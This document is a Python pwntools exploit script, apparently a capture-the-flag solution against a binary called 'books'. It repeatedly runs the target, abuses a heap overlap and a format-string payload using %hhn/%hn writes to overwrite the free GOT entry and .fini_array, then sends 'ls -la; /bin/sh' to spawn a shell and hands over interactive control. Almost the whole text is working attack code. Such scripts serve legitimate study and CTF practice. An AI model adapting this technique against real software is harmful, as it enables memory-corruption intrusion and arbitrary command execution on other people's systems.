#!/usr/bin/env python

from pwn import *
import sys


context.log_level = "debug"

elf = "./books"

def edit(idx, s):
    p.recvuntil("5: Submit\n")
    if idx == "1":
        p.sendline("1")
        p.recvline("Enter first order:")
    elif idx == "2":
        p.sendline("2")
        p.recvline("Enter second order:")

    p.sendline(s)


def delete(idx):
    if str(idx) == "1":
        p.sendline("3")
    elif str(idx) == "2":
        p.sendline("4")


fini_array = 0x6011b8
free_got = 0x6013b8

for i in range(0x100000):
    try:
        p = process(elf)

        delete(2)

        payload = "%10$.82x%13$hhn"
        payload += "%10$.822x%14$hn"
        payload += "%10$.1705x%15$hn"
        payload += "A"*(0x7c-len(payload))
        payload += p8(0)*(0x88-len(payload))
        payload += p64(0x151)
        edit("1", payload)

        payload = "5"+p8(0)*0x7
        payload += p64(free_got+0x2)
        payload += p64(free_got)
        payload += p64(fini_array)
        p.sendline(payload)

        payload = "echo Good!;"
        payload += "ls -la; /bin/sh"
        edit("1", payload)

        delete(1)

        print "Interation: "+hex(i)
        result = p.recvuntil("Good!")
        if "Good!" in result:
            print "SUCCESS"
            break

        p.close()

    except Exception as e:
        print e.message
        time.sleep(1)
        continue
 

p.interactive()
